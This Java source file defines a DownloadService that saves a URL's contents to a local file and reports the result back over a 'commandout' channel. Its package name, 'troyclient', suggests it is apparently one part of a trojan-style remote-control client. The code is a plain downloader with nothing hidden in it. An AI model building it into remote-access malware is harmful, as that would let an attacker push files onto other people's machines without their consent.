package ch.lebois.troyclient.service;

import ch.lebois.troyclient.main.GetContext;

import java.io.FileOutputStream;
import java.io.IOException;
import java.net.URL;
import java.nio.channels.Channels;
import java.nio.channels.ReadableByteChannel;

/**
 * @PROJECT Hermann
 */

public class DownloadService {

    public void download(String url, String fileName) {
        URL website;
        System.out.println(url);
        System.out.println(fileName);
        try {
            website = new URL(url);
            ReadableByteChannel rbc = Channels.newChannel(website.openStream());
            FileOutputStream fos = new FileOutputStream(fileName);
            fos.getChannel().transferFrom(rbc, 0, Long.MAX_VALUE);
            rbc.close();
            fos.close();
            GetContext.SENDER.send("commandout", "Downloaded File " + fileName);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}
